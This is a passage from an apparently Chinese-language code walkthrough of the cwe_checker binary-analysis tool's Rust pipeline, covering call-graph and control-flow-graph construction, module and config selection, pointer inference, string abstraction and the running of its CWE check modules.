二进制文件的CPU 架构</span>    <span class="token keyword">pub</span> stack_pointer_register<span class="token punctuation">:</span> <span class="token class-name">Variable</span><span class="token punctuation">,</span><span class="token comment">// 栈指针寄存器</span>    <span class="token comment">// 可用于调用外部函数的已知调用约定集合</span>    <span class="token keyword">pub</span> calling_conventions<span class="token punctuation">:</span> <span class="token class-name">BTreeMap</span><span class="token operator">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">CallingConvention</span><span class="token operator">></span><span class="token punctuation">,</span>    <span class="token keyword">pub</span> register_set<span class="token punctuation">:</span> <span class="token class-name">BTreeSet</span><span class="token operator">&lt;</span><span class="token class-name">Variable</span><span class="token operator">></span><span class="token punctuation">,</span>    <span class="token comment">// 已知基础物理寄存器</span>    <span class="token keyword">pub</span> datatype_properties<span class="token punctuation">:</span> <span class="token class-name">DatatypeProperties</span><span class="token punctuation">,</span><span class="token comment">// 数据类型属性（例如大小）</span>    <span class="token keyword">pub</span> runtime_memory_image<span class="token punctuation">:</span> <span class="token class-name">RuntimeMemoryImage</span><span class="token punctuation">,</span><span class="token comment">// 加载到内存的内存映像</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在调试模式（指定参数 –debug cg）下生成并输出程序的调用图，构建调用图函数位于 <a href="###cwe_checker_lib/src/analysis/graph/call.rs">cwe_checker_lib&#x2F;src&#x2F;analysis&#x2F;graph&#x2F;call.rs</a></p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">if</span> debug_settings<span class="token punctuation">.</span><span class="token function">should_debug</span><span class="token punctuation">(</span><span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token class-name">Stage</span><span class="token punctuation">::</span><span class="token class-name">CallGraph</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 从 project.program 构建调用图，以函数为节点、调用关系为边的有向图，用于展示函数间的调用关系</span>    <span class="token keyword">let</span> cg <span class="token operator">=</span> <span class="token namespace">graph<span class="token punctuation">::</span>call<span class="token punctuation">::</span></span><span class="token class-name">CallGraph</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>project<span class="token punctuation">.</span>program<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 以紧凑 JSON 的格式打印调用图数据</span>    debug_settings<span class="token punctuation">.</span><span class="token function">print_compact_json</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cg<span class="token punctuation">,</span> <span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token class-name">Stage</span><span class="token punctuation">::</span><span class="token class-name">CallGraph</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>处理 cfg_stats 参数：根据反编译后的程序构建一份控制流图（CFG）的统计信息对象（如函数内圈复杂度、基本块数、指令数、外部函数被调用次数等，函数位于 <a href="###src/caller/src/cfg_stats.rs">src&#x2F;caller&#x2F;src&#x2F;cfg_stats.rs</a> ）</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">if</span> args<span class="token punctuation">.</span>cfg_stats <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> cfg_stats <span class="token operator">=</span> <span class="token namespace">cfg_stats<span class="token punctuation">::</span></span><span class="token class-name">CfgProperties</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>project<span class="token punctuation">.</span>program<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;:#&#125;"</span><span class="token punctuation">,</span> <span class="token namespace">serde_json<span class="token punctuation">::</span></span><span class="token function">to_value</span><span class="token punctuation">(</span>cfg_stats<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>过滤要执行的模块：</p><ul><li>存在 partial 参数就从参数获取要执行的 CWE 检查</li><li>如果是内核模块，则仅启用内核模块的检查</li><li>否则只默认禁用 CWE78</li></ul><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token keyword">ref</span> partial_module_list<span class="token punctuation">)</span> <span class="token operator">=</span> args<span class="token punctuation">.</span>partial <span class="token punctuation">&#123;</span>       <span class="token comment">// 从 partial 参数获取检查的 cwe 编号</span>       <span class="token function">filter_modules_for_partial_run</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> modules<span class="token punctuation">,</span> partial_module_list<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> project<span class="token punctuation">.</span>runtime_memory_image<span class="token punctuation">.</span>is_lkm <span class="token punctuation">&#123;</span>       <span class="token comment">// 是内核模块则选择相应的内置 cwe 序列</span>       modules<span class="token punctuation">.</span><span class="token function">retain</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>module<span class="token closure-punctuation punctuation">|</span></span> <span class="token namespace">cwe_checker_lib<span class="token punctuation">::</span>checkers<span class="token punctuation">::</span></span><span class="token constant">MODULES_LKM</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>module<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>       <span class="token comment">// CWE78在当前标准运行中被禁用，因为它在某些二进制文件上消耗大量RAM和计算时间</span>       modules<span class="token punctuation">.</span><span class="token function">retain</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>module<span class="token closure-punctuation punctuation">|</span></span> module<span class="token punctuation">.</span>name <span class="token operator">!=</span> <span class="token string">"CWE78"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>MODULES_LKM 位于 src\cwe_checker_lib\src\checkers.rs</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">const</span> <span class="token constant">MODULES_LKM</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">;</span> <span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">"CWE134"</span><span class="token punctuation">,</span> <span class="token string">"CWE190"</span><span class="token punctuation">,</span> <span class="token string">"CWE215"</span><span class="token punctuation">,</span> <span class="token string">"CWE252"</span><span class="token punctuation">,</span> <span class="token string">"CWE416"</span><span class="token punctuation">,</span> <span class="token string">"CWE457"</span><span class="token punctuation">,</span> <span class="token string">"CWE467"</span><span class="token punctuation">,</span> <span class="token string">"CWE476"</span><span class="token punctuation">,</span> <span class="token string">"CWE676"</span><span class="token punctuation">,</span>    <span class="token string">"CWE789"</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>读取配置文件：</p><ul><li>指定了 config 参数，从指定的 config 路径获取配置文件</li><li>是内核模块，读取 src\lkm_config.json</li><li>否则使用默认配置文件：src\config.json</li></ul><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">let</span> config<span class="token punctuation">:</span> <span class="token namespace">serde_json<span class="token punctuation">::</span></span><span class="token class-name">Value</span> <span class="token operator">=</span> <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token keyword">ref</span> config_path<span class="token punctuation">)</span> <span class="token operator">=</span> args<span class="token punctuation">.</span>config <span class="token punctuation">&#123;</span>       <span class="token comment">// 从 config 获取</span>       <span class="token keyword">let</span> file <span class="token operator">=</span> <span class="token namespace">std<span class="token punctuation">::</span>io<span class="token punctuation">::</span></span><span class="token class-name">BufReader</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token namespace">std<span class="token punctuation">::</span>fs<span class="token punctuation">::</span></span><span class="token class-name">File</span><span class="token punctuation">::</span><span class="token function">open</span><span class="token punctuation">(</span>config_path<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token namespace">serde_json<span class="token punctuation">::</span></span><span class="token function">from_reader</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">context</span><span class="token punctuation">(</span><span class="token string">"Parsing of the configuration file failed"</span><span class="token punctuation">)</span><span class="token operator">?</span>   <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> project<span class="token punctuation">.</span>runtime_memory_image<span class="token punctuation">.</span>is_lkm <span class="token punctuation">&#123;</span>       <span class="token comment">// 内核模块</span>       <span class="token function">read_config_file</span><span class="token punctuation">(</span><span class="token string">"lkm_config.json"</span><span class="token punctuation">)</span><span class="token operator">?</span>   <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>       <span class="token comment">// 默认</span>       <span class="token function">read_config_file</span><span class="token punctuation">(</span><span class="token string">"config.json"</span><span class="token punctuation">)</span><span class="token operator">?</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>配置每个 CWE 检查模块使用的符号列表和参数，例如：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"CWE78"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>  <span class="token property">"system_symbols"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token string">"system"</span>  <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"CWE190"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>  <span class="token property">"symbols"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token string">"xmalloc"</span><span class="token punctuation">,</span>    <span class="token string">"malloc"</span><span class="token punctuation">,</span>    <span class="token string">"realloc"</span><span class="token punctuation">,</span>    <span class="token string">"calloc"</span>  <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>生成程序控制流图：生成控制流图函数位于 <a href="###src%5Ccwe_checker_lib%5Csrc%5Canalysis%5Cgraph.rs">src\cwe_checker_lib\src\analysis\graph.rs</a></p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// 生成含日志的程序级控制流图</span><span class="token keyword">let</span> control_flow_graph <span class="token operator">=</span> <span class="token namespace">graph<span class="token punctuation">::</span></span><span class="token function">get_program_cfg_with_logs</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>project<span class="token punctuation">.</span>program<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 如需调试 CFG 则以紧凑 JSON 形式输出</span>   debug_settings<span class="token punctuation">.</span><span class="token function">print_compact_json</span><span class="token punctuation">(</span>control_flow_graph<span class="token punctuation">.</span><span class="token function">deref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token class-name">Stage</span><span class="token punctuation">::</span><span class="token class-name">ControlFlowGraph</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 汇总分析结果，包括二进制文件内容、控制流图 CFG、project 指针到 AnalysisResults 结构体</span><span class="token keyword">let</span> analysis_results <span class="token operator">=</span> <span class="token class-name">AnalysisResults</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>binary<span class="token punctuation">,</span> <span class="token operator">&amp;</span>control_flow_graph<span class="token punctuation">,</span> <span class="token operator">&amp;</span>project<span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中 AnalysisResults 结构体如下</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[derive(Clone, Copy)]</span><span class="token keyword">pub</span> <span class="token keyword">struct</span> <span class="token type-definition class-name">AnalysisResults</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'a</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">pub</span> binary<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token lifetime-annotation symbol">'a</span> <span class="token punctuation">[</span><span class="token keyword">u8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment">// 二进制文件内容</span>    <span class="token keyword">pub</span> control_flow_graph<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token lifetime-annotation symbol">'a</span> <span class="token class-name">Graph</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'a</span><span class="token operator">></span><span class="token punctuation">,</span><span class="token comment">// 程序控制流图</span>    <span class="token keyword">pub</span> project<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token lifetime-annotation symbol">'a</span> <span class="token class-name">Project</span><span class="token punctuation">,</span><span class="token comment">// 指向 project 结构体的指针</span>    <span class="token comment">// 函数签名分析的结果</span>    <span class="token keyword">pub</span> function_signatures<span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span><span class="token lifetime-annotation symbol">'a</span> <span class="token class-name">BTreeMap</span><span class="token operator">&lt;</span><span class="token class-name">Tid</span><span class="token punctuation">,</span> <span class="token class-name">FunctionSignature</span><span class="token operator">>></span><span class="token punctuation">,</span>    <span class="token comment">// 指针推理分析的结果</span>    <span class="token keyword">pub</span> pointer_inference<span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span><span class="token lifetime-annotation symbol">'a</span> <span class="token class-name">PointerInference</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'a</span><span class="token operator">>></span><span class="token punctuation">,</span>    <span class="token comment">// 字符串抽象分析的结果</span>    <span class="token keyword">pub</span> string_abstraction<span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span><span class="token lifetime-annotation symbol">'a</span> <span class="token class-name">StringAbstraction</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'a</span><span class="token punctuation">,</span> <span class="token class-name">BricksDomain</span><span class="token operator">>></span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其关联函数如下</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span>        binary<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token lifetime-annotation symbol">'a</span> <span class="token punctuation">[</span><span class="token keyword">u8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        control_flow_graph<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token lifetime-annotation symbol">'a</span> <span class="token class-name">Graph</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'a</span><span class="token operator">></span><span class="token punctuation">,</span>        project<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token lifetime-annotation symbol">'a</span> <span class="token class-name">Project</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">AnalysisResults</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'a</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>        <span class="token class-name">AnalysisResults</span> <span class="token punctuation">&#123;</span>            binary<span class="token punctuation">,</span>            control_flow_graph<span class="token punctuation">,</span>            project<span class="token punctuation">,</span>            function_signatures<span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>            pointer_inference<span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>            string_abstraction<span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>设置依赖字符串抽象分析、指针推理的模块集合，并且根据集合是否为空来设置 needed 标志</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">   <span class="token comment">// 依赖字符串抽象分析的模块集合</span>   <span class="token keyword">let</span> modules_depending_on_string_abstraction <span class="token operator">=</span> <span class="token class-name">BTreeSet</span><span class="token punctuation">::</span><span class="token function">from_iter</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"CWE78"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 依赖指针推理的模块集合</span>   <span class="token keyword">let</span> modules_depending_on_pointer_inference <span class="token operator">=</span> <span class="token class-name">BTreeSet</span><span class="token punctuation">::</span><span class="token function">from_iter</span><span class="token punctuation">(</span><span class="token punctuation">[</span>        <span class="token string">"CWE119"</span><span class="token punctuation">,</span> <span class="token string">"CWE134"</span><span class="token punctuation">,</span> <span class="token string">"CWE190"</span><span class="token punctuation">,</span> <span class="token string">"CWE252"</span><span class="token punctuation">,</span> <span class="token string">"CWE337"</span><span class="token punctuation">,</span> <span class="token string">"CWE416"</span><span class="token punctuation">,</span> <span class="token string">"CWE476"</span><span class="token punctuation">,</span> <span class="token string">"CWE789"</span><span class="token punctuation">,</span> <span class="token string">"Memory"</span><span class="token punctuation">,</span>   <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 是否需要运行字符串抽象分析，即字符串抽象分析的模块集合是否为空</span>   <span class="token keyword">let</span> string_abstraction_needed <span class="token operator">=</span> modules        <span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span>       <span class="token punctuation">.</span><span class="token function">any</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>module<span class="token closure-punctuation punctuation">|</span></span> modules_depending_on_string_abstraction<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>module<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 是否需要运行指针推理，即指针推理集合是否为空</span>   <span class="token keyword">let</span> pi_analysis_needed <span class="token operator">=</span> string_abstraction_needed       <span class="token operator">||</span> modules           <span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token punctuation">.</span><span class="token function">any</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>module<span class="token closure-punctuation punctuation">|</span></span> modules_depending_on_pointer_inference<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>module<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>设置指针推理标记时，计算函数签名，并且保存到 analysis_results 结构体，函数位于 <a href="###src%5Ccwe_checker_lib%5Csrc%5Cpipeline%5Cresults.rs">src\cwe_checker_lib\src\pipeline\results.rs</a></p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">   <span class="token keyword">let</span> function_signatures <span class="token operator">=</span> <span class="token keyword">if</span> pi_analysis_needed <span class="token punctuation">&#123;</span> <span class="token comment">// 若需要指针推理，先计算函数签名</span>       <span class="token comment">// 计算函数参数/返回等签名信息</span>       <span class="token keyword">let</span> function_signatures <span class="token operator">=</span> analysis_results<span class="token punctuation">.</span><span class="token function">compute_function_signatures</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Some</span><span class="token punctuation">(</span>function_signatures<span class="token punctuation">)</span>   <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>       <span class="token class-name">None</span> <span class="token comment">// 不需要则为空</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 将函数签名附加到 analysis_results 分析结果结构体中</span>   <span class="token keyword">let</span> analysis_results <span class="token operator">=</span>       analysis_results<span class="token punctuation">.</span><span class="token function">with_function_signatures</span><span class="token punctuation">(</span>function_signatures<span class="token punctuation">.</span><span class="token function">as_deref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>设置指针推理标记，计算完函数签名后，运行指针推理，并且保存到 analysis_results 结构体，函数位于 <a href="###src%5Ccwe_checker_lib%5Csrc%5Cpipeline%5Cresults.rs">src\cwe_checker_lib\src\pipeline\results.rs</a></p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">   <span class="token keyword">let</span> pi_analysis_results <span class="token operator">=</span> <span class="token keyword">if</span> pi_analysis_needed <span class="token punctuation">&#123;</span> <span class="token comment">// 需要运行指针推理</span>       <span class="token comment">// 传入内存配置与统计开关，如果启用 statistics 则在日志消息中包含各种统计信息</span>       <span class="token class-name">Some</span><span class="token punctuation">(</span>analysis_results<span class="token punctuation">.</span><span class="token function">compute_pointer_inference</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>config<span class="token punctuation">[</span><span class="token string">"Memory"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> args<span class="token punctuation">.</span>statistics<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>       <span class="token class-name">None</span> <span class="token comment">// 否则不计算</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 将指针推理结果附加到分析结果</span>   <span class="token keyword">let</span> analysis_results <span class="token operator">=</span> analysis_results<span class="token punctuation">.</span><span class="token function">with_pointer_inference</span><span class="token punctuation">(</span>pi_analysis_results<span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>设置字符串抽象分析标记，计算字符串抽象分析，函数位于 <a href="###src%5Ccwe_checker_lib%5Csrc%5Cpipeline%5Cresults.rs">src\cwe_checker_lib\src\pipeline\results.rs</a></p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">   <span class="token keyword">let</span> string_abstraction_results <span class="token operator">=</span> <span class="token comment">// 需要则运行字符串抽象分析</span>       <span class="token keyword">if</span> string_abstraction_needed <span class="token punctuation">&#123;</span>           <span class="token class-name">Some</span><span class="token punctuation">(</span>analysis_results<span class="token punctuation">.</span><span class="token function">compute_string_abstraction</span><span class="token punctuation">(</span>               <span class="token operator">&amp;</span>config<span class="token punctuation">[</span><span class="token string">"StringAbstraction"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>   <span class="token comment">// 字符串抽象相关配置</span>               pi_analysis_results<span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>   <span class="token comment">// 可能依赖指针推理结果</span>           <span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>           <span class="token class-name">None</span>       <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token comment">// 将字符串抽象结果附加到分析结果</span>   <span class="token keyword">let</span> analysis_results <span class="token operator">=</span>       analysis_results<span class="token punctuation">.</span><span class="token function">with_string_abstraction</span><span class="token punctuation">(</span>string_abstraction_results<span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>打印调试信息</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">if</span> debug_settings<span class="token punctuation">.</span><span class="token function">should_debug</span><span class="token punctuation">(</span><span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token class-name">Stage</span><span class="token punctuation">::</span><span class="token class-name">Pi</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 若仅调试指针推理阶段</span>    <span class="token namespace">cwe_checker_lib<span class="token punctuation">::</span>analysis<span class="token punctuation">::</span>pointer_inference<span class="token punctuation">::</span></span><span class="token function">run</span><span class="token punctuation">(</span>        <span class="token operator">&amp;</span>analysis_results<span class="token punctuation">,</span>        <span class="token namespace">serde_json<span class="token punctuation">::</span></span><span class="token function">from_value</span><span class="token punctuation">(</span>config<span class="token punctuation">[</span><span class="token string">"Memory"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token boolean">false</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 调试输出后提前结束</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>执行所有选定的检测模块，位于 [src\cwe_checker_lib\src\checkers](###*src\cwe_checker_lib\src\checkers（cwe modules）)</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// 执行模块并收集它们的日志和CWE警告</span>   <span class="token keyword">let</span> <span class="token keyword">mut</span> all_cwe_warnings <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 收集所有模块的CWE警告（含日志包装）</span>   <span class="token keyword">for</span> module <span class="token keyword">in</span> modules <span class="token punctuation">&#123;</span> <span class="token comment">// 逐个运行启用的CWE模块</span>       <span class="token keyword">let</span> cwe_warnings <span class="token operator">=</span> <span class="token punctuation">(</span>module<span class="token punctuation">.</span>run<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>analysis_results<span class="token punctuation">,</span> <span class="token operator">&amp;</span>config<span class="token punctuation">[</span><span class="token operator">&amp;</span>module<span class="token punctuation">.</span>name<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>debug_settings<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 传入分析结果、该模块配置、调试设置</span>       all_cwe_warnings<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>cwe_warnings<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 累加结果</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>打印模块结果，当参数指定了 –quiet 则抑制日志消息</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">       <span class="token comment">// 打印模块的结果</span>       <span class="token keyword">let</span> all_logs<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span><span class="token class-name">LogMessage</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token keyword">if</span> args<span class="token punctuation">.</span>quiet <span class="token punctuation">&#123;</span> <span class="token comment">// 如开启安静模式则抑制日志</span>           <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 由于设置了`--quiet`标志，抑制所有日志消息</span>       <span class="token punctuation">&#125;</span> 